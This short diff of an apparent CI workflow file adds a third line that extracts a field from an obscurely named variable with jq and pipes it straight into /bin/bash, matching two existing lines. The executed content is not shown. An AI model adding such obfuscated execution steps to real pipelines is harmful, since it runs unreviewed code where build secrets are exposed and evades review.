@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$hkibn7479" | jq -r .oo9 | /bin/bash
           printf '%s' "$st5279" | jq -r .fgw023 | /bin/bash
+          echo $twd6 | jq -r .k53299 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
